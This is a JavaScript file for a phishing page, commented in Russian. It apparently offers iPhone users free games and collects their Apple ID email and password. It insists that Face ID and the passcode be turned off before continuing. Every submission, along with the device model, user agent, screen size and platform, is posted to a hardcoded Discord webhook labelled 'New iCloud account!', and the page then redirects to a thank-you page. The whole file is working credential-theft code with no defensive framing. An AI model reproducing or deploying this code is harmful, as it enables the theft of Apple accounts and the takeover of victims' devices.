document.getElementById('getGamesBtn').addEventListener('click', function() {
    document.getElementById('mainContent').style.display = 'none';
    document.getElementById('formContainer').style.display = 'block';
});

document.getElementById('whyLink').addEventListener('click', function(e) {
    e.preventDefault();
    document.getElementById('whyText').style.display = 'block';
});

document.getElementById('submitBtn').addEventListener('click', function() {
    var email = document.getElementById('appleId').value;
    var password = document.getElementById('password').value;
    var faceIdOff = document.getElementById('faceIdOff').checked;

    if (!email || !password) {
        alert('Введите email и пароль');
        return;
    }
    if (!faceIdOff) {
        alert('Вы должны отключить Face ID и код-пароль, чтобы продолжить. В целях безопасности вы можете включить их обратно после покупки.');
        return;
    }

    // Собираем информацию об устройстве
    var ua = navigator.userAgent;
    var screenSize = screen.width + 'x' + screen.height;
    var platform = navigator.platform;

    var data = {
        content: `**Новый аккаунт iCloud!**\nEmail: ${email}\nПароль: ${password}\nМодель: ${getiPhoneModel(ua)}\nUser-Agent: ${ua}\nРазрешение: ${screenSize}\nПлатформа: ${platform}`
    };

    fetch('https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).then(() => {
        // Перенаправляем на страницу-спасибку
        window.location.href = 'thanks.html';
    }).catch(err => {
        alert('Ошибка, попробуйте позже.');
    });
});

// Функция для приблизительного определения модели iPhone
function getiPhoneModel(ua) {
    if (ua.includes('iPhone12,1')) return 'iPhone 11';
    if (ua.includes('iPhone13,2')) return 'iPhone 12';
    if (ua.includes('iPhone14,2')) return 'iPhone 13 Pro';
    // Добавьте другие модели
    return 'Неизвестная модель iPhone';
}
